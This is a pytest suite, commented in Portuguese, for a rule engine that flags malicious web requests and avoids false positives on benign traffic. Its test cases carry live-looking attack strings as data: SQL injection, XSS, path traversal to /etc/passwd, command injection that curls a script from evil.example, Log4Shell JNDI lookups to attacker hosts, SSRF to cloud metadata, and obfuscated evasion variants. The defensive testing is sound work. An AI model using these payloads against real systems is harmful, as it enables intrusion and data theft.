"""Rule engine tests.

Dividido em duas metades que puxam para lados opostos:

* **Detecção** — cada categoria precisa disparar no ataque correspondente,
  inclusive nas formas ofuscadas.
* **Falso positivo** — o corpus benigno é a metade que importa mais. Regra que
  dispara em tráfego normal é pior que regra que não existe: enterra o analista em
  ruído até ele parar de olhar os alertas.
"""

from __future__ import annotations

import pytest

from app.detection import normalize
from app.detection.engine import RuleEngine, RuleLoadError, load_rules
from tests.conftest import make_entry

HIGH_THRESHOLD = 0.7
MEDIUM_THRESHOLD = 0.5


@pytest.fixture(scope="module")
def engine() -> RuleEngine:
    return RuleEngine()


def score_of(engine: RuleEngine, **overrides: object) -> float:
    return engine.evaluate(make_entry(**overrides))[0]


def categories_of(engine: RuleEngine, **overrides: object) -> set[str]:
    _score, matches = engine.evaluate(make_entry(**overrides))
    return {m.category for m in matches}


# ---------------------------------------------------------------------------
# Carregamento
# ---------------------------------------------------------------------------


def test_rules_load_and_compile() -> None:
    """Regex inválida tem que quebrar o arranque, não a detecção em produção."""
    rules = load_rules()
    assert len(rules) > 40
    assert {r.category for r in rules} >= {
        "sqli",
        "xss",
        "traversal",
        "cmdi",
        "log4shell",
        "ssrf",
        "scanner",
        "protocol",
    }


def test_rule_ids_are_unique() -> None:
    """ID duplicado tornaria impossível rastrear qual regra gerou o alerta."""
    ids = [rule.id for rule in load_rules()]
    assert len(ids) == len(set(ids))


def test_all_scores_in_range() -> None:
    assert all(0.0 <= rule.score <= 1.0 for rule in load_rules())


def test_invalid_rule_directory_raises(tmp_path: object) -> None:
    from pathlib import Path

    with pytest.raises(RuleLoadError):
        load_rules(Path(str(tmp_path)) / "nao-existe")


def test_malformed_rule_rejected_at_load(tmp_path: object) -> None:
    from pathlib import Path

    directory = Path(str(tmp_path))
    (directory / "ruim.yaml").write_text(
        "rules:\n  - id: X\n    category: sqli\n    score: 0.5\n    pattern: '('\n",
        encoding="utf-8",
    )
    with pytest.raises(RuleLoadError, match="regex inválida"):
        load_rules(directory)


def test_out_of_range_score_rejected(tmp_path: object) -> None:
    from pathlib import Path

    directory = Path(str(tmp_path))
    (directory / "ruim.yaml").write_text(
        "rules:\n  - id: X\n    category: sqli\n    score: 5.0\n    pattern: 'abc'\n",
        encoding="utf-8",
    )
    with pytest.raises(RuleLoadError, match="fora de"):
        load_rules(directory)


# ---------------------------------------------------------------------------
# Detecção por categoria
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("categoria", "query"),
    [
        ("sqli", "id=1' UNION SELECT senha FROM usuarios--"),
        ("sqli", "id=1; DROP TABLE usuarios"),
        ("sqli", "busca=x' OR '1'='1"),
        ("sqli", "id=1 AND SLEEP(5)"),
        ("sqli", "id=-1 UNION ALL SELECT NULL,table_name FROM information_schema.tables"),
        ("xss", "q=<script>alert(document.cookie)</script>"),
        ("xss", "nome=<img src=x onerror=alert(1)>"),
        ("xss", "url=javascript:alert(1)"),
        ("xss", "html=<svg onload=alert(1)>"),
        ("traversal", "arquivo=../../../../etc/passwd"),
        ("traversal", "template=....//....//etc/shadow"),
        ("cmdi", "host=localhost; cat /etc/passwd"),
        ("cmdi", "ping=8.8.8.8 | whoami"),
        ("cmdi", "cmd=$(curl http://evil.example/x.sh)"),
        ("log4shell", "x=${jndi:ldap://evil.example/a}"),
        ("ssrf", "url=http://169.254.169.254/latest/meta-data/"),
        ("ssrf", "fetch=http://127.0.0.1:8080/admin"),
    ],
)
def test_attack_payloads_are_detected(engine: RuleEngine, categoria: str, query: str) -> None:
    score, matches = engine.evaluate(make_entry(query=query))
    found = {m.category for m in matches}
    assert categoria in found, f"{categoria} não detectado em: {query} (achou {found})"
    assert score >= HIGH_THRESHOLD, f"escore {score:.2f} abaixo de HIGH em: {query}"


def test_scanner_user_agent_detected(engine: RuleEngine) -> None:
    assert "scanner" in categories_of(engine, user_agent="sqlmap/1.8#stable")
    assert "scanner" in categories_of(engine, user_agent="Mozilla/5.0 (Nikto/2.5.0)")


def test_log4shell_in_user_agent(engine: RuleEngine) -> None:
    """O payload do Log4Shell chega quase sempre em cabeçalho, não na URI."""
    score, matches = engine.evaluate(
        make_entry(user_agent="${jndi:ldap://attacker.example/exploit}")
    )
    assert "log4shell" in {m.category for m in matches}
    assert score >= 0.95


def test_malformed_request_flagged_as_protocol_anomaly(engine: RuleEngine) -> None:
    assert "protocol" in categories_of(engine, method="INVALID", protocol="INVALID")


# ---------------------------------------------------------------------------
# Evasão
# ---------------------------------------------------------------------------


def test_case_variation_does_not_evade(engine: RuleEngine) -> None:
    lower = score_of(engine, query="id=1 union select senha from usuarios")
    mixed = score_of(engine, query="id=1 UnIoN sElEcT senha FrOm usuarios")
    assert mixed == lower >= HIGH_THRESHOLD


def test_double_url_encoding_does_not_evade(engine: RuleEngine) -> None:
    """%2527 → %27 → aspa. Uma passada de decodificação só não bastaria."""
    assert score_of(engine, query="id=1%2527%2520or%2520%25271%2527%253d%25271") >= MEDIUM_THRESHOLD


def test_inline_comment_does_not_evade(engine: RuleEngine) -> None:
    """UN/**/ION SEL/**/ECT vira UNION SELECT na visão sem comentários."""
    assert score_of(engine, query="id=1 UNI/**/ON SELE/**/CT senha FROM usuarios") >= HIGH_THRESHOLD


def test_tab_and_newline_instead_of_space_does_not_evade(engine: RuleEngine) -> None:
    assert score_of(engine, query="id=1%09union%09select%09senha%09from%09x") >= HIGH_THRESHOLD


def test_obfuscated_jndi_does_not_evade(engine: RuleEngine) -> None:
    assert "log4shell" in categories_of(engine, user_agent="${${lower:j}${lower:n}di:ldap://x/a}")


def test_null_byte_does_not_evade(engine: RuleEngine) -> None:
    assert score_of(engine, query="f=../../etc/pas%00swd") >= MEDIUM_THRESHOLD


# ---------------------------------------------------------------------------
# Corpus de falso positivo — a metade que mais importa
# ---------------------------------------------------------------------------

BENIGN_REQUESTS: list[tuple[str, dict[str, object]]] = [
    ("home", {"path": "/", "query": ""}),
    ("página de produto", {"path": "/produtos/notebook-gamer-15", "query": ""}),
    ("paginação", {"path": "/produtos", "query": "pagina=3&por_pagina=24"}),
    # `select` como nome de parâmetro é padrão de API (sparse fieldsets do JSON:API).
    ("campos esparsos", {"path": "/api/v1/usuarios", "query": "select=nome,email,criado_em"}),
    ("ordenação", {"path": "/api/v1/pedidos", "query": "order=data_desc&limit=50"}),
    # `env`, `id`, `pwd`, `ps`, `dir`, `export` são nomes de parâmetro comuns e
    # todos aparecem na lista de comandos da CMDI-001.
    (
        "parâmetros que parecem comando",
        {"path": "/api/deploy", "query": "env=prod&id=42&ps=1&dir=asc&export=csv&rm=0"},
    ),
    ("filtro com ponto e vírgula", {"path": "/api/busca", "query": "filtro=cor:azul;tamanho:m"}),
    ("filtro com pipe", {"path": "/api/busca", "query": "cores=preto|branco|azul"}),
    # `on` + palavra + `=` é o padrão que quebra filtro caseiro de XSS.
    (
        "parâmetros começando com on",
        {"path": "/config", "query": "online=1&once=true&only=nome&onboarding=done"},
    ),
    (
        "busca em português",
        {"path": "/busca", "query": "q=notebook%20com%2016gb%20de%20mem%C3%B3ria"},
    ),
    ("data ISO", {"path": "/relatorios", "query": "de=2026-01-01&ate=2026-08-06"}),
    ("uuid", {"path": "/api/v1/pedidos/9f8b7c6d-1e2f-4a3b-8c9d-0e1f2a3b4c5d", "query": ""}),
    ("asset com hash", {"path": "/static/js/main.4f3a2b1c.js", "query": ""}),
    ("imagem", {"path": "/media/fotos/produto-1234_800x600.webp", "query": ""}),
    ("healthcheck", {"path": "/health", "query": ""}),
    ("OAuth callback", {"path": "/auth/callback", "query": "code=abc123&state=xyz789"}),
    ("webhook", {"path": "/webhooks/pagamento", "method": "POST", "query": ""}),
    ("acentos no path", {"path": "/categorias/eletrodom%C3%A9sticos", "query": ""}),
    ("JSON em parâmetro", {"path": "/api/busca", "query": 'filtros={"cor":"azul","tam":"m"}'}),
    (
        "base64 em parâmetro",
        {"path": "/api/token", "query": "t=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"},
    ),
    ("versão semântica", {"path": "/downloads/app-2.1.0.tar.gz", "query": ""}),
    ("feed RSS", {"path": "/blog/feed.xml", "query": ""}),
    ("sitemap", {"path": "/sitemap.xml", "query": ""}),
    ("favicon", {"path": "/favicon.ico", "query": ""}),
    ("robots", {"path": "/robots.txt", "query": ""}),
]


@pytest.mark.parametrize(("rotulo", "campos"), BENIGN_REQUESTS, ids=[r for r, _ in BENIGN_REQUESTS])
def test_benign_traffic_stays_below_high(
    engine: RuleEngine, rotulo: str, campos: dict[str, object]
) -> None:
    """Nenhuma requisição legítima pode chegar a HIGH.

    Este é o teste de regressão que impede alguém de "melhorar a detecção"
    afrouxando um padrão e transformando o dashboard em ruído.
    """
    score, matches = engine.evaluate(make_entry(**campos))
    assert score < HIGH_THRESHOLD, (
        f"falso positivo em {rotulo!r}: escore {score:.2f}, regras {[m.rule_id for m in matches]}"
    )


def test_common_browser_agents_do_not_match(engine: RuleEngine) -> None:
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"  # noqa: E501 (UA real, verbatim),
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"  # noqa: E501 (UA real, verbatim),
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    ]
    for agent in agents:
        assert score_of(engine, user_agent=agent) < MEDIUM_THRESHOLD, agent


def test_oauth_redirect_stays_below_medium(engine: RuleEngine) -> None:
    """Fluxo normal de OAuth carrega URL absoluta em parâmetro.

    Regressão de um falso positivo real: a regra estava em 0.5, exatamente o
    limiar de MEDIUM, o que a habilitava a participar do bônus de concordância do
    ensemble. Com o modelo achando o caminho incomum, 0.5 + 0.1 virava HIGH e todo
    login com OAuth geraria alerta.

    Por isso o teste exige abaixo de MEDIUM, e não só abaixo de HIGH: sinal de
    apoio não pode alcançar sozinho o patamar que dispara o bônus.
    """
    score = score_of(
        engine,
        path="/oauth/authorize",
        query="redirect_uri=https://app.exemplo.com/callback&state=x",
    )
    assert score < MEDIUM_THRESHOLD, (
        f"escore {score:.2f} habilitaria o bônus de concordância e viraria HIGH"
    )


# ---------------------------------------------------------------------------
# Pontuação
# ---------------------------------------------------------------------------


def test_score_is_max_not_sum(engine: RuleEngine) -> None:
    """Somar faria três regras fracas da mesma família superarem uma regra forte."""
    score, matches = engine.evaluate(
        make_entry(query="id=1' UNION SELECT senha FROM usuarios-- AND 1=1")
    )
    assert len([m for m in matches if m.category == "sqli"]) > 1
    assert score <= 1.0
    assert score >= max(m.score for m in matches)


def test_distinct_categories_add_a_bonus(engine: RuleEngine) -> None:
    """SQLi e traversal juntos são sinal independente, não redundante."""
    single = score_of(engine, query="f=../../../../etc/passwd")
    combined = score_of(engine, query="f=../../../../etc/passwd&id=1' UNION SELECT senha FROM x--")
    assert combined > single


def test_score_never_exceeds_one(engine: RuleEngine) -> None:
    score = score_of(
        engine,
        query="a=${jndi:ldap://x/a}&b=' UNION SELECT 1--&c=../../etc/passwd&d=;cat /etc/shadow",
        user_agent="sqlmap/1.8",
    )
    assert score == 1.0


def test_clean_request_scores_zero(engine: RuleEngine) -> None:
    score, matches = engine.evaluate(make_entry(path="/sobre", query=""))
    assert score == 0.0
    assert matches == []


def test_match_records_evidence(engine: RuleEngine) -> None:
    """Sem o trecho que casou, o analista não consegue revisar o alerta."""
    _score, matches = engine.evaluate(make_entry(query="id=1 UNION SELECT senha FROM usuarios"))
    match = next(m for m in matches if m.category == "sqli")
    assert match.rule_id.startswith("SQLI-")
    assert ":" in match.matched_on
    assert match.description


# ---------------------------------------------------------------------------
# Normalização
# ---------------------------------------------------------------------------


def test_normalize_decodes_twice() -> None:
    assert normalize.decode_percent("%2527") == "'"


def test_normalize_collapses_whitespace() -> None:
    assert normalize.normalize("union%09%0a%20select") == "union select"


def test_normalize_strips_control_bytes() -> None:
    assert normalize.normalize("un%00ion") == "union"


def test_normalize_caps_field_length() -> None:
    """Regex sobre megabytes seria negação de serviço contra o próprio detector."""
    result = normalize.normalize("a" * 100_000)
    assert len(result) <= normalize.MAX_FIELD_LENGTH


def test_comment_stripping_only_in_dedicated_view() -> None:
    request = normalize.build("GET", "/a/*b*/c", "", "", "")
    assert "/*" in request.path or "*" in request.path
    assert "/*" not in request.uri_decommented
